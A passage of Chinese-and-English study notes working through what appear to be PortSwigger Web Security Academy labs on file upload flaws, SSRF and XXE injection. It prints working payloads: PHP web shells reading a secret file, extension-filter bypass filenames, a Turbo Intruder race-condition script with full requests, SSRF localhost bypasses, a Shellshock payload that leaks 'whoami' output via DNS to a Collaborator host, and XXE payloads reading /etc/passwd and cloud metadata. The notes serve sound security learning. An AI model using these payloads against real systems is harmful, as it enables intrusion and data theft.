shell,请求：原文显示<imgsrc="https://s2.loli.net/2023/08/13/nspE19KzCSbNvqI.png"alt="image-20230813060418284" /></li><li>路径遍历<ol type="1"><li>编码后，再次post<imgsrc="https://s2.loli.net/2023/08/13/tSHu5hoYyNqA4Vn.png"alt="image-20230813060547776" /></li><li>如果不编码，请求文件 <imgsrc="https://s2.loli.net/2023/08/13/6rBh5UxYAejCyOF.png" /></li></ol></li></ol><h4 id="overriding-the-server-configuration">Overriding the serverconfiguration</h4><ol type="1"><li><p>例如，Apache 服务器将从名为 <code>.htaccess</code>的文件（如果存在）加载特定于目录的配置。</p></li><li><p>同样，开发人员可以使用 <code>web.config</code> 文件在<code>IIS 服务器</code>上进行特定于目录的配置。这可能包括如下指令，在本例中允许向用户提供JSON 文件：</p><pre class="language-ini" data-language="ini"><code class="language-ini">&lt;staticContent>    <span class="token key attr-name">&lt;mimeMap fileExtension</span><span class="token punctuation">=</span><span class="token value attr-value">".json" mimeType="application/json" /></span>&lt;/staticContent></code></pre></li></ol><h4 id="lab-web-shell-upload-via-extension-blacklist-bypass">Lab: Webshell upload via extension blacklist bypass</h4><ol type="1"><li>上传php文件：<imgsrc="https://s2.loli.net/2023/08/13/S2IwgZ6vmk4XnfF.png"alt="image-20230813065423864" /></li><li>上传一个配置文件<imgsrc="https://s2.loli.net/2023/08/13/QtWG8F2VlyOu5hN.png"alt="image-20230813065453611" /></li><li>将待上传的php文件改为配置文件中的后缀：<code>.133t</code><imgsrc="https://s2.loli.net/2023/08/13/f2yeSE4dIiFjWT6.png"alt="image-20230813065655010" /></li><li>结果：<img src="https://s2.loli.net/2023/08/13/fVoR1Drz36qYWeX.png"alt="image-20230813065714032" /></li></ol><h4 id="obfuscating-file-extensions">Obfuscating file extensions</h4><ol type="1"><li><p>提供多种扩展。根据用于解析文件名的算法，以下文件可能被解释为 PHP文件或 JPG 图像：<code>exploit.php.jpg</code></p></li><li><p>添加尾随字符。某些组件会删除或忽略尾随空格、点等：<code>exploit.php.</code></p></li><li><p>尝试对点、正斜杠和反斜杠使用 URL 编码（或双 URL编码）。如果在验证文件扩展名时未对值进行解码，但随后在服务器端进行了解码，则这也可能允许您上传本来会被阻止的恶意文件：<code>exploit%2Ephp</code></p></li><li><p>在文件扩展名前添加分号或 URL 编码的空字节字符。例如，如果验证是用PHP 或 Java 等高级语言编写的，但服务器使用 C/C++中的较低级函数处理文件，则这可能会导致文件名结尾的处理方式出现差异：<code>exploit.asp;.jpg</code>or <code>exploit.asp%00.jpg</code></p></li><li><p>Try using multibyte <code>unicode</code> characters, which may beconverted to null bytes and dots after unicode conversion ornormalization. Sequences like <code>xC0 x2E</code>, <code>xC4 xAE</code>or <code>xC0 xAE</code> may be translated to <code>x2E</code> if thefilename parsed as a <code>UTF-8</code> string, but then converted to<code>ASCII characters</code> before being used in a path.</p></li><li><p><code>exploit.p.phphp</code></p></li></ol><h4 id="lab-web-shell-upload-via-obfuscated-file-extension">Lab: Webshell upload via obfuscated file extension</h4><ol type="1"><li><p>paylaod:<imgsrc="https://s2.loli.net/2023/08/13/jpvf4Vd3eb7ycxq.png" /></p><pre class="language-http" data-language="http"><code class="language-http">filename="test2.php%00.jpg"</code></pre></li><li><p>request<imgsrc="https://s2.loli.net/2023/08/13/EnlQTCBtR25qFXW.png"alt="image-20230813072102610" /></p></li></ol><h4 id="flawed-validation-of-the-files-contents">Flawed validation ofthe file's contents</h4><ol type="1"><li>类似地，某些文件类型可能始终在其<code>页眉</code>或页脚中包含特定的字节序列。这些可以像<code>指纹或签名</code>一样使用来确定内容是否与预期类型匹配。例如，JPEG文件始终以字节 <code>FF D8 FF</code> 开头。</li><li>使用 <code>ExifTool</code>等特殊工具，创建元数据中包含恶意代码的<code>polyglot JPEG file</code>很简单。</li></ol><h4 id="lab-remote-code-execution-via-polyglot-web-shell-upload">Lab:Remote code execution via polyglot web shell upload</h4><ol type="1"><li><p>制作图片马（<code>polyglot web shell</code>）</p><ol type="1"><li><p>在kali内，准备一张图片<imgsrc="https://s2.loli.net/2023/08/13/PwSGWfq9VZNYHXQ.png"alt="image-20230813075651361" /></p></li><li><p>command生成<imgsrc="https://s2.loli.net/2023/08/13/oPuHE6OLxgfKeir.png"alt="image-20230813075755469" /></p><pre class="language-bash" data-language="bash"><code class="language-bash">exiftool <span class="token parameter variable">-Comment</span><span class="token operator">=</span><span class="token string">"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"</span> <span class="token number">20181110151624</span>.png <span class="token parameter variable">-o</span> polyglot.php</code></pre></li></ol></li><li><p>上传polyglot.php</p></li><li><p>请求该文件<imgsrc="https://s2.loli.net/2023/08/13/BAznfPGyd9kMWgo.png"alt="image-20230813075837475" /></p></li></ol><h4 id="exploiting-file-upload-race-conditions">Exploiting file uploadrace conditions</h4><ol type="1"><li>相反，他们采取预防措施，例如首先上传到`<code>临时的沙盒目录</code>并<code>随机化名</code>称以避免覆盖现有文件。</li><li>这可能只需要<strong>几毫秒</strong>，但在文件存在于服务器上的短时间内，攻击者仍然有可能执行它。</li></ol><h4 id="lab-web-shell-upload-via-race-condition">Lab: Web shell uploadvia race condition</h4><ol type="1"><li><p>安装<code>turbo intruder</code></p></li><li><p>发送post请求(<strong>上传</strong>请求)到这个扩展<imgsrc="https://s2.loli.net/2023/08/13/2UYPbDfxHcdj3po.png"alt="image-20230813094700298" /></p></li><li><p>使用如下脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">queueRequests</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> wordlists<span class="token punctuation">)</span><span class="token punctuation">:</span>    engine <span class="token operator">=</span> RequestEngine<span class="token punctuation">(</span>endpoint<span class="token operator">=</span>target<span class="token punctuation">.</span>endpoint<span class="token punctuation">,</span> concurrentConnections<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    request1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;YOUR-POST-REQUEST>'''</span>    request2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;YOUR-GET-REQUEST>'''</span>    <span class="token comment"># the 'gate' argument blocks the final byte of each request until openGate is invoked</span>    engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request1<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request2<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    <span class="token comment"># wait until every 'race1' tagged request is ready</span>    <span class="token comment"># then send the final byte of each request</span>    <span class="token comment"># (this method is non-blocking, just like queue)</span>    engine<span class="token punctuation">.</span>openGate<span class="token punctuation">(</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    engine<span class="token punctuation">.</span>complete<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> interesting<span class="token punctuation">)</span><span class="token punctuation">:</span>    table<span class="token punctuation">.</span>add<span class="token punctuation">(</span>req<span class="token punctuation">)</span></code></pre></li><li><p>替换参数后 <code>request1</code> 和 <code>request2</code></p><ol type="1"><li><strong>注意</strong>：<ol type="1"><li>注意这两个请求的格式；</li><li>并且是<code>HTTP/1.1</code></li></ol></li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">queueRequests</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> wordlists<span class="token punctuation">)</span><span class="token punctuation">:</span>    engine <span class="token operator">=</span> RequestEngine<span class="token punctuation">(</span>endpoint<span class="token operator">=</span>target<span class="token punctuation">.</span>endpoint<span class="token punctuation">,</span> concurrentConnections<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    request1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /my-account/avatar HTTP/1.1Host: 0aa500530310b67c80e68f3b00bd001e.web-security-academy.netCookie: session=rnywyMgYRVeYjEzXMSVnWoRojxFolazAContent-Length: 474Cache-Control: max-age=0Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1Origin: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.netContent-Type: multipart/form-data; boundary=----WebKitFormBoundary1M9f5EglegfyCjOTUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.net/my-account?id=wienerAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7------WebKitFormBoundary1M9f5EglegfyCjOTContent-Disposition: form-data; name="avatar"; filename="test2.php"Content-Type: application/octet-stream&lt;?php echo file_get_contents('/home/carlos/secret'); ?>------WebKitFormBoundary1M9f5EglegfyCjOTContent-Disposition: form-data; name="user"wiener------WebKitFormBoundary1M9f5EglegfyCjOTContent-Disposition: form-data; name="csrf"hBN5d6yFfgd0jNxoTTvpMrqXCe3eTFNM------WebKitFormBoundary1M9f5EglegfyCjOT--'''</span>    request2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /files/avatars/test2.php HTTP/2Host: 0aa500530310b67c80e68f3b00bd001e.web-security-academy.netCookie: session=rnywyMgYRVeYjEzXMSVnWoRojxFolazASec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.net/my-accountAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7If-None-Match: "9627-602c39c67c7e3"If-Modified-Since: Sun, 13 Aug 2023 01:10:26 GMT'''</span>    <span class="token comment"># the 'gate' argument blocks the final byte of each request until openGate is invoked</span>    engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request1<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request2<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    <span class="token comment"># wait until every 'race1' tagged request is ready</span>    <span class="token comment"># then send the final byte of each request</span>    <span class="token comment"># (this method is non-blocking, just like queue)</span>    engine<span class="token punctuation">.</span>openGate<span class="token punctuation">(</span><span class="token string">'race1'</span><span class="token punctuation">)</span>    engine<span class="token punctuation">.</span>complete<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> interesting<span class="token punctuation">)</span><span class="token punctuation">:</span>    table<span class="token punctuation">.</span>add<span class="token punctuation">(</span>req<span class="token punctuation">)</span></code></pre></li><li><p>结果<img src="https://s2.loli.net/2023/08/13/EKa1uCqgoG4w5OM.png"alt="image-20230813095101955" /></p></li></ol><h4 id="race-conditions-in-url-based-file-uploads">Race conditions inURL-based file uploads</h4><ol type="1"><li>您可以尝试<strong>延长</strong>处理文件所需的时间，从而延长了暴力破解目录名称的窗口。一种方法是上传<strong>更大的文件</strong>。如果以块的形式处理它，您可以通过创建一个恶意文件来利用这一点，该文件的开头是有效负载，后跟大量任意填充字节。</li></ol><h4 id="uploading-malicious-client-side-scripts">Uploading maliciousclient-side scripts</h4><ol type="1"><li>if you can upload <code>HTML files</code> or<code>SVG images</code>, you can potentially use<code>&lt;script&gt;</code> tags to create <code>stored XSS</code>payloads.</li></ol><h4 id="uploading-files-using-put">Uploading files using PUT</h4><ol type="1"><li><p>If appropriate defenses aren't in place, this can provide analternative means of uploading malicious files, <strong>even</strong>when an upload function isn't available via the web interface.</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>images<span class="token path-separator">/</span>exploit.php</span></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-httpd-php</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">49</span></span>&lt;?php echo file_get_contents('/path/to/file'); ?></code></pre></li></ol><h3 id="server-side-request-forgery-ssrf">Server-side request forgery(SSRF)</h3><ol type="1"><li><p>Server-side request forgery (also known as SSRF) is a websecurity vulnerability that allows an attacker to<strong>induce</strong> the server-side application to make requests toan unintended location.</p></li><li><p>However, when the request to the /<code>admin</code> URL comesfrom the <code>local machine</code> itself, the normal access controlsare bypassed. The application grants full access to the administrativefunctionality, because the request appears to <strong>originate from atrusted location.</strong></p></li><li><p>The URL specification contains a number of features that areliable to be overlooked when implementing ad hoc parsing and validationof URLs:</p><ul><li><p>You can embed credentials in a URL before the hostname, using the<code>@</code> character. For example:</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;expected-host:fakepassword@evil-host</code></pre></li><li><p>You can use the <code>#</code> character to indicate a URLfragment. For example:</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;evil-host#expected-host</code></pre></li><li><p>You can leverage the DNS naming hierarchy to place required inputinto a fully-qualified DNS name that you control. For example:</p><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;expected-host.evil-host</code></pre></li><li><p>You can URL-encode characters to confuse the URL-parsing code.This is particularly useful if the code that implements the filterhandles URL-encoded characters differently than the code that performsthe back-end HTTP request. Note that you can also try <ahref="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a>characters; some servers recursively URL-decode the input they receive,which can lead to further discrepancies.</p></li><li><p>You can use combinations of these techniques together.</p></li></ul></li></ol><h4 id="lab-basic-ssrf-against-the-local-server">Lab: Basic SSRF againstthe local server</h4><ol type="1"><li>These kind of <strong>trust relationships</strong>, where requestsoriginating from the local machine are handled differently than ordinaryrequests, is often what makes SSRF into a critical vulnerability.</li><li>check stock<imgsrc="https://s2.loli.net/2023/08/14/XuryvgJ9nYA7Op1.png"alt="image-20230814060840698" /></li><li>parameter:stockAPi<imgsrc="https://s2.loli.net/2023/08/14/D4MplKrduUFk1si.png" /></li><li>modify parameter <imgsrc="https://s2.loli.net/2023/08/14/dkguVR8EwjtnaZT.png"alt="image-20230814061014089" /></li></ol><h4 id="lab-basic-ssrf-against-another-back-end-system">Lab: Basic SSRFagainst another back-end system</h4><ol type="1"><li><p>intruder:192.168.0.x<imgsrc="https://s2.loli.net/2023/08/14/LshJb6e2gcBZOSD.png"alt="image-20230814064551863" /></p></li><li><p>select this<imgsrc="https://s2.loli.net/2023/08/14/lSOLTZR2nvychG8.png"alt="image-20230814064628703" /></p></li></ol><h4 id="circumventing-common-ssrf-defenses">Circumventing common SSRFdefenses</h4><ol type="1"><li>Using an alternative IP representation of <code>127.0.0.1</code>,such as <code>2130706433</code>, <code>017700000001</code>, or<code>127.1</code>.</li><li>Registering your own domain name that resolves to<code>127.0.0.1</code>. You can use<code>spoofed.burpcollaborator.net</code> for this purpose</li><li>Providing a URL that you control, which subsequently redirects tothe target URL. Try using d<strong>ifferent redirect codes</strong>, aswell as <strong>different protocols</strong> for the target URL. Forexample, switching from an <code>http:</code> to <code>https:</code> URLduring the redirect has been shown to bypass some anti-SSRFfilters.</li></ol><h4 id="lab-ssrf-with-blacklist-based-input-filter">Lab: SSRF withblacklist-based input filter</h4><ol type="1"><li>test<ol type="1"><li><code>127.0.0.1</code><imgsrc="https://s2.loli.net/2023/08/14/x2vtnuldOz4VSsq.png"alt="image-20230814065913566" /></li><li><code>127.1</code><imgsrc="https://s2.loli.net/2023/08/14/lBTfgOmUXbkHena.png"alt="image-20230814065950052" /></li><li><code>127.1/admin</code><imgsrc="https://s2.loli.net/2023/08/14/Usf5dK8Gh1vqFnW.png"alt="image-20230814070011409" /></li></ol></li><li><code>admin</code> :double urlcode 'a'<imgsrc="https://s2.loli.net/2023/08/14/1mKf3vanruOG8UR.png"alt="image-20230814070114779" /></li></ol><h4 id="bypassing-ssrf-filters-via-open-redirection">Bypassing SSRFfilters via open redirection</h4><h4id="lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability">Lab:SSRF with filter bypass via open redirection vulnerability</h4><ol type="1"><li>observe parameter:<code>path</code> <imgsrc="https://s2.loli.net/2023/08/14/NWGiOz318K7JwTl.png" /></li><li>modify stockApi<imgsrc="https://s2.loli.net/2023/08/14/sQ5dne7I2EuCJal.png"alt="image-20230814071433646" /></li></ol><h4 id="blind-ssrf-vulnerabilities">Blind SSRF vulnerabilities</h4><ol type="1"><li>The most reliable way to detect blind SSRF vulnerabilities is using<code>out-of-band (OAST)</code> techniques.</li></ol><h4 id="lab-blind-ssrf-with-out-of-band-detection">Lab: Blind SSRF without-of-band detection</h4><ol type="1"><li>replace <code>Referer</code> with Collaborator payload <imgsrc="https://s2.loli.net/2023/08/14/4tubNROUroCmWJK.png"alt="image-20230814074916651" /></li></ol><h4 id="lab-blind-ssrf-with-shellshock-exploitation">Lab: Blind SSRFwith Shellshock exploitation]</h4><ol type="1"><li><p>install extension:<code>Collaborator Everywhere</code> <imgsrc="https://s2.loli.net/2023/08/14/yVGth93nEoxpwXA.png"alt="image-20230814082010294" /></p></li><li><p>load a product page<imgsrc="https://s2.loli.net/2023/08/14/R7ZTGIJauv1hFYo.png"alt="image-20230814082141247" /></p></li><li><p>observe:some issues<imgsrc="https://s2.loli.net/2023/08/14/ABCVpvG9weoPk3I.png"alt="image-20230814082257631" /></p></li><li><p>intruder:user-agent and referer<imgsrc="https://s2.loli.net/2023/08/14/YwmOc8rgb3hRBQZ.png"alt="image-20230814082321399" /></p><ol type="1"><li><p>user-agent:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> /usr/bin/nslookup <span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span>.BURP-COLLABORATOR-SUBDOMAIN</code></pre><p>这个负载的目的是在受影响的系统上利用Shellshock漏洞执行恶意操作，特别是通过执行<code>nslookup</code>命令来触发DNS查询，将结果发送到名为"BURP-COLLABORATOR-SUBDOMAIN" 的Collaborator域。分解一下这个负载：</p><ol type="1"><li><p><code>() &#123; :; &#125;;</code>：这是一个Shellshock漏洞的利用技巧。在这里，<code>()</code>创建了一个匿名的Shell函数，紧接着是<code>&#123; :; &#125;</code>，这是一个伪命令，不执行任何操作。这种结构可以绕过Shellshock修补程序中的一些保护措施。</p></li><li><p><code>/usr/bin/nslookup</code>：这部分指定了要执行的命令，即<code>nslookup</code> 命令。<code>nslookup</code>命令用于执行DNS查询，通常用于查找域名的IP地址。</p></li><li><p><code>$(whoami).BURP-COLLABORATOR-SUBDOMAIN</code>：这部分利用Shell的命令替换功能，将当前用户的用户名（通过<code>whoami</code> 命令获取）与<code>BURP-COLLABORATOR-SUBDOMAIN</code>拼接在一起，形成一个域名。该域名将作为参数传递给 <code>nslookup</code>命令，触发DNS查询。总之，这个负载的目标是通过Shellshock漏洞，使用已经被注入的环境变量来执行<code>nslookup</code>命令，然后触发DNS查询，将恶意操作结果发送到一个名为"BURP-COLLABORATOR-SUBDOMAIN"的Collaborator域。这可以用来检测和利用受影响系统上的Shellshock漏洞，并在攻击者控制的Collaborator服务器上获取一些信息。</p></li></ol></li><li><p>referer:http://192.168.0.1:8080</p></li><li><p>intruderpaylaod <imgsrc="https://s2.loli.net/2023/08/14/D8KLnTlbsHZgmjU.png"alt="image-20230814082614622" /></p></li></ol></li><li><p>collaborator:<imgsrc="https://s2.loli.net/2023/08/14/j1GCuiQpf4I7zlM.png"alt="image-20230814082659313" /></p></li></ol><h4 id="lab-ssrf-with-whitelist-based-input-filter">Lab: SSRF withwhitelist-based input filter</h4><ol type="1"><li><code>%2523</code>：这是 <code>#</code> 符号的双 URL 编码。<code>%25</code> 是 <code>%</code> 符号的 URL 编码，而 <code>%23</code>是 <code>#</code> 符号的 URL 编码。<imgsrc="https://s2.loli.net/2023/08/14/aUn26gO8vDdoVc5.png"alt="image-20230814090052414" /></li></ol><h3 id="xml-external-entity-xxe-injection">XML external entity (XXE)injection</h3><h4 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrievefiles</h4><ol type="1"><li>POST /product/stock<imgsrc="https://s2.loli.net/2023/08/14/3fXUSd18F4q5Pxp.png"alt="image-20230814120112426" /></li><li>modify xml<imgsrc="https://s2.loli.net/2023/08/14/6vgOIWXuUbrfQZ5.png"alt="image-20230814120127298" /></li></ol><h4 id="lab-exploiting-xxe-to-perform-ssrf-attacks">Lab: Exploiting XXEto perform SSRF attacks</h4><ol type="1"><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><ul><li><code>&lt;!DOCTYPE test [ ... ]&gt;</code>：这是DTD（Document TypeDefinition）声明的一部分，它用于定义文档的结构和元素。在这里，您正在为文档引入一个名为"test" 的DTD。</li><li><code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt;</code>：这是一个实体定义。实体是XML文档中的占位符，可以包含文本或外部数据。在这里，您定义了一个名为"xxe" 的实体，其内容指向了 <code>http://169.254.169.254/</code>这个URL。这个URL是一个特殊的地址，通常用于在内部网络中访问metadata服务</li><li><code>metadata</code>服务通常指的是云计算平台中的一种服务，它提供了有关云实例（虚拟机、容器等）的元数据信息。这些元数据可以包括实例的属性、配置、网络信息、安全凭据等。</li></ul></li><li><p>get next level's directory<imgsrc="https://s2.loli.net/2023/08/14/IUY2JB63cZhbzpy.png"alt="image-20230814123506750" /></p></li><li><p>next hierarchy <imgsrc="https://s2.loli.net/2023/08/14/SI5BAudVxw7MvT2.png"alt="image-20230814123538806" /></p></li><li><p>最后<img src="https://s2.loli.net/2023/08/14/pDwPmzCiMIWUJo6.png"alt="image-20230814123612435" /></p></li></ol><h4 id="finding-hidden-attack-surface-for-xxe-injection">Finding hiddenattack surface for XXE injection</h4><ol type="1"><li>if you look in the right places, you will find XXE attack surface inrequests that <strong>do not contain any XML.</strong></li></ol><h4 id="lab-exploiting-xinclude-to-retrieve-files">Lab: ExploitingXInclude to retrieve files</h4><ol type="1"><li><p>payload<imgsrc="https://s2.loli.net/2023/08/14/b7wLtZEHPBSdGKF.png"alt="image-20230814150739064" /></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre><ol type="1"><li><code>&lt;foo&gt;</code>是一个XML元素示例。它与攻击无直接关系，但作为包含XInclude操作的容器。</li><li><code>xmlns:xi="http://www.w3.org/2001/XInclude"</code>声明了一个命名空间前缀 "xi"，关联到XInclude命名空间URI。这用于引用类似<code>&lt;xi:include&gt;</code> 的XInclude元素。</li><li><code>&lt;xi:include&gt;</code>是XInclude元素。它用于从另一个XML文档中包含内容。在这种情况下，<code>href</code>属性指定要包含的文件路径。</li><li><code>parse="text"</code>表示内容应该解析为纯文本。这很重要，因为XInclude还可以包含XML内容，但在这个示例中，您将其视为纯文本。</li><li><code>href="file:///etc/passwd"</code>指定要包含的文件路径。在这种情况下，<code>/etc/passwd</code>是类Unix系统中常见的文件，包含用户帐户信息。</li></ol></li></ol><h4 id="xxe-attacks-via-file-upload">XXE attacks via file upload</h4><ol type="1"><li>Some common file formats use XML or contain XML subcomponents.Examples of XML-based formats are office document formats like<code>DOCX</code> and image formats like <code>SVG.</code></li></ol><h4 id="lab-exploiting-xxe-via-image-file-upload">Lab: Exploiting XXEvia image file upload</h4><ol type="1"><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="yes"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">font-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre></li><li><p>make a svg file<imgsrc="https://s2.loli.net/2023/08/14/ejucVUXH4TiyoNK.png" /></p></li><li><p>in comment:upload file as avatar</p></li><li><p>request this avatar<imgsrc="https://s2.loli.net/2023/08/14/quUjdIh4XyvgSPW.png"alt="image-20230814153350876" /><imgsrc="https://s2.loli.net/2023/08/14/IfbSaz8lRnKNY5M.png"alt="image-20230814153324602" /></p></li></ol><h4 id="how-to-find-and-test-for-xxe-vulnerabilities">How to find andtest for XXE vulnerabilities</h4><ol type="1"><li>Make sure you also test any XML-based functionality for<strong>other vulnerabilities</strong> like XSS and SQL injection.</li></ol><h4 id="xml-entities">XML entities</h4><ol type="1"><li><p>The XML document type definition (<code>DTD</code>)</p></li><li><p>What are XML <strong>custom entities</strong>?</p><p>XML allows custom entities to be defined within the DTD. Forexample:</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code></pre><p>This definition means that any usage of the entity reference<code>&amp;myentity;</code> within the XML document will be replacedwith the defined value: "<code>my entity value</code>".</p></li><li><p>What are XML <strong>external entities</strong>?</p><p>XML external entities are a type of custom entity whose definition islocated outside of the DTD where they are declared.</p><p>The declaration of an external entity uses the 